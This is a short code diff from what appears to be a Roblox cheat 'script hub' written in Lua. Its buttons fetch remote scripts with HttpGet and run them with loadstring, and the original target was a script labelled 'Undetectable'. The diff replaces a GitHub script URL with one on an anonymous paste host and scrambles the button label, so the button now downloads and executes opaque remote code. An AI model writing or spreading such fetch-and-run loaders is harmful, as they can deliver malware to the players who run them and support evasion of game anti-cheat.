@@ -272,8 +272,8 @@ loadstring(game:HttpGet(('https://raw.githubusercontent.com/Cortzalno666/NectoVe
     print('Script Loaded')
 end)
 
-tab.newButton("011101101110000001100101", "01010110001?", function()
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/Cortzalno666/NectoVerse-Industries-Data/master/Scripts%20Folder/g00pgui%20v1(Undetectable).lua'),true))()
+tab.newButton("011101101F11L000000X1100E101", "01010110001?", function()
+loadstring(game:HttpGet(('https://envs.sh/eyI.txt'),true))()
     print('Script Loaded')
 end)
 
